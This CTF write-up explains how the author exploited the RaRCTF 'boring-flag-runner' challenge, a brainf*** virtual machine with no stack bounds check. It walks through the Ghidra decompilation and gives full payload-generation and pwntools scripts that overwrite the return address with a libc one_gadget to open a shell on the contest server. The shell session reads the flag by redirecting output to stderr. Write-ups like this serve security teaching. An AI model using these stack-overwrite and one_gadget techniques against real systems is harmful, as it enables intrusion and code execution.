The link to the original writeup is [here](https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/RaRCTF/boring_flag_runner), please check it out
there to see the downloadables from the challenge and my solves as standalone
python scripts.

# boring-flag-runner

The description for this challenge was as follows:

*'willwam writes pwn?' - fizzbuzz101*

*Note: This challenge has the same binary as boring-flag-checker*  
*Note 2: please use the docker to test your solution locally, there should be no bruteforce required on remote*

The challenge was worth 300 points, and was rated at medium difficulty.
However, it only had 13 solves at the end of competition. Personally, I think
that most of the difficulty on this one was in the reverse engineering, since
the actual implementation of my exploit was fairly straightforward. This is
also my first experience with a virtual machine exploit, so that was fun!

**TL;DR Solution:** Figure out that the program is taking a user-provided
payload and executing it as a type of brainf*** interpreter. Design a payload
that modifies the stack to set rbp to a section of writable memory, rbp+0x8 to
a onegadget, and pop a shell when the program exits.

## Gathering Information

Simply connecting to the remote instance does not give us much information:  
```  
knittingirl@piglet:~/CTF/RaRCTF/guessing$ nc 193.57.159.27 28643  
enter your program: aaaaaaaaaaaaaaaaaaaaaaaaaaa  
```  
The decompilation of the program in Ghidra gives us a lot more to work with.
Please note that this only relates to the binary; some of the other files in
the docker are very relevant to behavior and are discussed later. So, if a
valid filename is passed as a command line argument, it will be opened and
read into a stack variable. Here is the cleaned-up decompilation:  
```  
 else {  
   opened_file = fopen(param_2[1],"rb");  
   if ((opened_file == (FILE *)0x0) &&  
      (opened_file = fopen("prog.bin","rb"), opened_file == (FILE *)0x0)) {  
     puts("Couldn\'t open program.");  
                   /* WARNING: Subroutine does not return */  
     exit(-1);  
   }  
 }  
 file_size_var = file_size(opened_file,&actual_file_size,&actual_file_size);  
 if (((file_size_var == -1) ||  
     (file_buffer = (byte *)calloc(actual_file_size,1), file_buffer == (byte *)0x0)) ||  
    (sVar1 = fread(file_buffer,1,actual_file_size,opened_file), sVar1 != actual_file_size)) {  
   puts("Couldn\'t read program.");  
                   /* WARNING: Subroutine does not return */  
   exit(-1);  
 }  
 fclose(opened_file);  
```  
In terms of actual behavior, the program appears to be stepping through the
contents of the file character by character. Based on what each character is,
one of eight switch cases is performed. At this point, my teammate, who was
working on the reverse engineering challenge for this same binary, identified
that this was probably a virtual machine that is emulating the brainf***
language (attempting to keep this safe for work folks, you know what I mean!).
That language has exactly eight characters, and when you have a look  
```  
 while ((ulong)(long)program_counter < actual_file_size) {  
   if (loop_back == 0) {  
     weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  
                   /* <]>[,.-+ */  
     switch((file_buffer[program_counter] + weird & 7) - weird) {  
     case 0:  
       data_pointer = data_pointer + 1;  
       break;  
     case 1:  
       if (data[data_pointer] == 0) {  
         paranthesis_records[function_return_helper + -1] = 0;  
         function_return_helper = function_return_helper + -1;  
       }  
       else {  
         program_counter = paranthesis_records[function_return_helper + -1];  
       }  
       break;  
     case 2:  
       data_pointer = data_pointer + -1;  
       break;  
     case 3:  
       if (data[data_pointer] == 0) {  
         loop_back = 1;  
       }  
       else {  
         paranthesis_records[(int)function_return_helper] = program_counter;  
         function_return_helper = function_return_helper + '\x01';  
       }  
       break;  
     case 4:  
       if (local_28 == 0) {  
         read(0,user_input,0x37);  
       }  
       data[data_pointer] = user_input[local_28];  
       local_28 = local_28 + 1;  
       break;  
     case 5:  
       putchar((int)(char)data[data_pointer]);  
       break;  
     case 6:  
       data[data_pointer] = data[data_pointer] - 1;  
       break;  
     case 7:  
       data[data_pointer] = data[data_pointer] + 1;  
       break;  
     default:  
       goto switchD_001014f2_caseD_8;  
     }  
   }  
   else {  
     weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  
     if ((byte)((file_buffer[program_counter] + weird & 7) - weird) == '\x03') {  
       loop_back = loop_back + 1;  
     }  
     else {  
       weird = (byte)((char)file_buffer[program_counter] >> 7) >> 5;  
       if ((byte)((file_buffer[program_counter] + weird & 7) - weird) == '\x01') {  
         loop_back = loop_back + -1;  
       }  
     }  
   }  
   program_counter = program_counter + 1;  
 }  
 free(file_buffer);  
switchD_001014f2_caseD_8:  
 return 0;  
}  
```  
Based on the entry in the esolangs wiki, here are the mappings of each
character to its corresponding actions:  
```  
>       Move the pointer to the right  
<       Move the pointer to the left  
+ 	Increment the memory cell at the pointer  
- 	Decrement the memory cell at the pointer  
.       Output the character signified by the cell at the pointer  
,       Input a character and store it in the cell at the pointer  
[       Jump past the matching ] if the cell at the pointer is 0  
]       Jump back to the matching [ if the cell at the pointer is nonzero  
```  
The virtual machine in the binary is basically using bytes of the stack as
brainf***'s concept of cells. In this language, each cell can effectively be
manipulated as much as desired, albeit with very low level instructions. In
addition, this machine's implementation does not do any type of bounds check
of which parts of the stack I am allowed to manipulate. As a result, this
introduces the possibility of format string-like leaks of addresses stored in
the stack, as well direct overwrites of the stack pointer to create a
ROPchain.

Now, the switch case statement is actually checking the last nibble (hex
digit) of the hexadecimal representation of each character in the file. If
that nibble is 0, it will go to case 0, if it's 1, it goes to case 1, etc. As
a result, it's not actually interpreting typical brainf*** characters, and we
need to map them onto something that works. I created a simple python script
to take code written in the bf language, convert it to what this virtual
machine will accept, and write it to a file.  
```  
file1 = open('sample_program', 'wb')  
hello_world =
'++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.'

bf_chars = '>]<[,.-+'

plain = b'\x40\x41\x42\x43\x44\x45\x46\x47'  
for char in hello_world:  
	index = bf_chars.find(char)  
	file1.write(chr(plain[index]).encode('ascii'))

file1.close()  
```  
If we run the basic binary with that payload, we get Hello World! output to
the terminal.  
```  
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ ./boring-flag-checker
sample_program  
Hello World!  
```  
Now, the actual binary is not behaving quite like the remote instance; there
is no prompt to "enter your program" during its execution. The start.sh script
indicates that that the getprog.py script runs before boring-flag-checker.
getprog.py itself is very simple; it has the "enter your program" prompt, it
takes user input, and it saves a maximum of 4000 bytes of that input to the
filename indicated by a command-line argument. When boring-flag-checker runs,
it takes that file as an argument. As a result, we should be able to pass in
any modified brainf*** script we like, and it should be run by the binary  
```  
#!/bin/sh

cd /challenge  
FILENAME=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 16)  
python3 getprog.py /tmp/$FILENAME  
timeout 10 ./boring-flag-checker /tmp/$FILENAME > /dev/null  
rm /tmp/$FILENAME  
```  
```  
import sys

prog = input("enter your program: ").encode("latin-1")  
open(f"{sys.argv[1]}", "wb").write(prog[:4000])  
```  
The last hiccup is that when I attempt to pass my Hello World! script to the
remote instance, seemingly nothing happens:  
```  
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ nc 193.57.159.27 28643  
enter your program:
GGGGGGGGC@GGGGC@GG@GGG@GGG@GBBBBFA@G@G@F@@GCBABFA@@E@FFFEGGGGGGGEEGGGE@@EBFEBEGGGEFFFFFFEFFFFFFFFE@@GE@GGE  
```  
Eventually, I realized that the problem was in the start.sh script; it is
piping my output to /dev/null rather than letting me see it. As a result,
while I can write pretty much whatever exploit script I want, I will not be
able to get any visible leaks.  
```  
timeout 10 ./boring-flag-checker /tmp/$FILENAME > /dev/null  
```

## Planning the Exploit

So, we effectively have complete control over the stack, albeit with no way to
leak data to the console. When we run the binary by itself in GDB, we see that
rbp itself is empty, rbp+0x8 contains a libc address, and rbp+0x10 contains
another libc address.  
```  
gef➤  x/gx $rbp  
0x7fffffffdfd0: 0x0000000000000000  
gef➤  x/gx $rbp+0x8  
0x7fffffffdfd8: 0x00007ffff7ded0b3  
gef➤  x/gx $rbp+0x10  
0x7fffffffdfe0: 0x00007ffff7ffc620  
gef➤  x/5i 0x00007ffff7ded0b3  
  0x7ffff7ded0b3 <__libc_start_main+243>:       mov    edi,eax  
  0x7ffff7ded0b5 <__libc_start_main+245>:       call   0x7ffff7e0fbc0
<__GI_exit>  
  0x7ffff7ded0ba <__libc_start_main+250>:       mov    rax,QWORD PTR [rsp+0x8]  
  0x7ffff7ded0bf <__libc_start_main+255>:       lea    rdi,[rip+0x18fda2]
# 0x7ffff7f7ce68  
  0x7ffff7ded0c6 <__libc_start_main+262>:       mov    rsi,QWORD PTR [rax]  
```  
At this point, I set a breakpoint for the very end of the main function, then
checked the value of the rsi and rdx registers at that point. As I discussed
in the writeup for "The Guessing Game" from this CTF
(https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/RaRCTF/Guessing_Game), this version of libc has
a onegadget that should be satisfied if the value or contents of rsi are 0,
and the value or contents of rdx is 0. Both are true at the point that this
gadget would be triggered. We would also need to set the value in rbp such
that it - 0x78 is a writable address.  
```  
knittingirl@piglet:~/CTF/RaRCTF/guessing$ one_gadget
libc6_2.31-0ubuntu9.2_amd64.so  
0xe6e73 execve("/bin/sh", r10, r12)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)  
constraints:  
 [r10] == NULL || r10 == NULL  
 [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)  
constraints:  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL  
```  
As a result, the basic idea is to modify the last 3 bytes of the value in
rbp+0x8 to make it equal a onegadget. Then, since libc addresses are nearby on
the stack, we can set rbp to equal one of them, then increase the address
slightly to make it equal to somewhere in the writable section. All of this is
possible within the brainf*** language.

## Writing the Exploit

Firstly, modifying the value in rbp+0x8 is relatively simple. We need to bring
the data pointer up to the lowest byte of the address, which can be
accomplished by moving the pointer right the appropriate number of bytes, in
this case, 0x130 + 8. Now, while brainf*** does not really provide a
sophisticated mechanism for addition or subtraction, it does give us
increments and decrements that can be repeated for the same effect on single
bytes. For reference, example values for our addresses are:  
```  
__libc_start_main+243 is at 0x7ffff7ded0b3  
The onegadget is at 0x7ffff7eace79  
```

Since the last byte of our libc addresses will always be the same (it is
originally __libc_start_main+243, ending in b3, and we want a onegadget that
ends in 79), we can simply decrement the byte 58 (0x3a) times. The next two
bytes are not constant, so it is possible that we addition or subtraction
could result in carry-overs affecting other bytes. Accounting for this would
have been a headache, and the differences in these bytes is relatively small,
so I decided to carry on with single-byte increment/decrements and take the
small risk of failure on any given execution. The python script to generate
the brainf*** code to do this is here (Note: the '.'s don't accomplish
anything since I can't see output on the server, but I found them useful when
debugging my payloads. I would recommend a breakpoint at main+845, and a check
of the contents at rbp+rax*1-0x130 to gauge where your data pointer is
pointing and what value this area of the stack currently contains):  
```  
bf_payload = '>' * (0x130 + 0x8) + '.' + '-' * 58  + '>' + '-' * 0x2 + '>' +
'+' * 12  
```  
Next, I had to fix the value in rbp. The esoland wiki provides an example of
moving values between cells that worked out well; as written, the script
zeroes out the cell that it is copying from, so having an extra libc address
in rbp+0x10 was very useful. The explanation of that script is here:  
```  
Code:   Pseudo code:  
>>      Move the pointer to cell2  
[-]     Set cell2 to 0  
<<      Move the pointer back to cell0  
[       While cell0 is not 0  
 -       Subtract 1 from cell0  
 >>      Move the pointer to cell2  
 <<      Move the pointer back to cell0  
]       End while  
```  
In an example run, the contents of rbp+0x10 were equal to 0x00007ffff7ffc620.
After looking at vmmap on the same run, it looks like 0x00007ffff7ff**d**620
would be in writable memory, so if I just increment the second byte up 0x10
times after moving it to rbp, I should have the stack set up for a successful
exploit.  
```  
gef➤  vmmap  
[ Legend:  Code | Heap | Stack ]  
Start              End                Offset             Perm Path  
0x0000555555554000 0x0000555555555000 0x0000000000000000 r--
/home/ubuntu/Downloads/boring-flag-checker  
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x
/home/ubuntu/Downloads/boring-flag-checker  
0x0000555555556000 0x0000555555557000 0x0000000000002000 r--
/home/ubuntu/Downloads/boring-flag-checker  
0x0000555555557000 0x0000555555558000 0x0000000000002000 r--
/home/ubuntu/Downloads/boring-flag-checker  
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw-
/home/ubuntu/Downloads/boring-flag-checker  
0x00007ffff7dc6000 0x00007ffff7deb000 0x0000000000000000 r--
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7deb000 0x00007ffff7f63000 0x0000000000025000 r-x
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7f63000 0x00007ffff7fad000 0x000000000019d000 r--
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7fad000 0x00007ffff7fae000 0x00000000001e7000 ---
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7fae000 0x00007ffff7fb1000 0x00000000001e7000 r--
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7fb1000 0x00007ffff7fb4000 0x00000000001ea000 rw-
/usr/lib/x86_64-linux-gnu/libc-2.31.so  
0x00007ffff7fb4000 0x00007ffff7fba000 0x0000000000000000 rw-  
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]  
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]  
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r--
/usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x
/usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r--
/usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r--
/usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw-
/usr/lib/x86_64-linux-gnu/ld-2.31.so  
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-  
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]  
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]  
gef➤  
```  
So, the example script from the wiki basically just needs to have each of the
portions that move the pointer up by two cells increased to 16, as well as
adding more pointer movements to move to the next byte of the address. I also
incremented the second byte up from 0x10 will I on that byte. Here is the
relevant portion of the script:  
```  
bf_payload += '<' * (8 + 2) + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>'
* 0x10 + ']' + '.' + '<' * 0x10  
bf_payload += '>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 +
']' + '.'  + '<' * 0x10 + '+' * 0x10  
bf_payload += ('>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 +
']' + '.'  + '<' * 0x10) * 4  
```  
The final, full script to create the modified brainf*** script and store it in
a file for local testing is below; it came it at a mere 838 characters even
with some extra characters for debugging left in, so well within the maximum
of 4000 bytes:  
```  
file1 = open('sample_program', 'wb')

bf_chars = '>]<[,.-+'  
bf_payload = '>' * (0x130 + 0x8) + '.' + '-' * 58  + '>' + '-' * 0x2 + '>' +
'+' * 12

bf_payload += '<' * (8 + 2) + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>'
* 0x10 + ']' + '.' + '<' * 0x10  
bf_payload += '>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 +
']' + '.'  + '<' * 0x10 + '+' * 0x10  
bf_payload += ('>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 +
']' + '.'  + '<' * 0x10) * 4

plain = b'\x40\x41\x42\x43\x44\x45\x46\x47'  
for char in bf_payload:  
	index = bf_chars.find(char)  
	file1.write(chr(plain[index]).encode('ascii'))

file1.close()

```  
I also came up pwntools script to automatically connect to the remote server
and feed in the payload, but in this case, you could easily just copy-paste
the modified brainf*** script and input it manually.  
```  
from pwn import *

#target = remote('localhost', 1337)  
target = remote('193.57.159.27', 28643)

print(target.recvuntil('program:'))

payload = b''

bf_payload = '<' * (0x130 + 0x8) + '.' + '-' * 58  + '<' + '-' * 0x2 + '<' +
'+' * 12

bf_payload += '>' * (8 + 2) + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<'
* 0x10 + ']' + '.' + '>' * 0x10  
bf_payload += '<' + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<' * 0x10 +
']' + '.'  + '>' * 0x10 + '+' * 0x10  
bf_payload += ('<' + '.' + '<' * 0x10 + '[-' + '>' * 0x10 + '+' + '<' * 0x10 +
']' + '.'  + '>' * 0x10) * 4

bf_chars = '<]>[,.-+'  
plain = b'\x40\x41\x42\x43\x44\x45\x46\x47'  
for char in bf_payload:  
	index = bf_chars.find(char)  
	payload += chr(plain[index]).encode('ascii')  
print(payload)

target.sendline(payload)

target.interactive()

```  
### Interacting with the Shell:

Now, the fact that user input is getting redirected to /dev/null persists even
after I popped a shell. My first idea was to set up some sort of reverse shell
with netcat or similar, but I don't have a public-facing IP set up, so that
would just be a massive hassle even if it would probably work. However, I came
to a realization when typed in a non-shell command; I still get to see the
results of stderr!  
```  
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ python3
boring_flag_runner_payload_final.py  
[+] Opening connection to 193.57.159.27 on port 28643: Done  
b'enter your program:'  
b'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@EFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF@FF@GGGGGGGGGGGGBBBBBBBBBBE@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBBGGGGGGGGGGGGGGGG@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB'  
[*] Switching to interactive mode  
$ ls  
$ hello  
sh: 2: hello: not found  
```  
So, if we just just pipe stdout to stderr, we should be able to view the
results of any typical shell command. The session timed out fairly quickly, so
it took a couple of goes, but the end result looks like this:  
```  
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ python3
boring_flag_runner_payload_final.py  
[+] Opening connection to 193.57.159.27 on port 28643: Done  
b'enter your program:'  
b'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@EFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF@FF@GGGGGGGGGGGGBBBBBBBBBBE@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBBGGGGGGGGGGGGGGGG@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB'  
[*] Switching to interactive mode  
$ ls / 1>&2  
bin  
boot  
challenge  
dev  
etc  
home  
lib  
lib32  
lib64  
libx32  
media  
mnt  
opt  
proc  
root  
run  
sbin  
srv  
sys  
tmp  
usr  
var  
$ ls /challenge 1>&2  
Dockerfile  
boring-flag-checker  
build.sh  
ctf.xinetd  
flag.txt  
getprog.py  
start.sh  
[*] Got EOF while reading in interactive  
$  
[*] Interrupted  
knittingirl@piglet:~/CTF/RaRCTF/boring_flag_runner$ python3
boring_flag_runner_payload_final.py  
[+] Opening connection to 193.57.159.27 on port 28643: Done  
b'enter your program:'  
b'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@EFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF@FF@GGGGGGGGGGGGBBBBBBBBBBE@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBBGGGGGGGGGGGGGGGG@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB@E@@@@@@@@@@@@@@@@CFBBBBBBBBBBBBBBBBG@@@@@@@@@@@@@@@@AEBBBBBBBBBBBBBBBB'  
[*] Switching to interactive mode  
$ cat /challenge/flag.txt 1>&2  
rarctf{my_br41nf$%k_vm_d03snt_c4r3_f0r_s1lly_b0unds-ch3ck5_56fc255324}  
[*] Got EOF while reading in interactive  
$  
```  
Thanks for reading!

## References:

https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/RaRCTF/Guessing_Game

https://esolangs.org/wiki/Brainfuck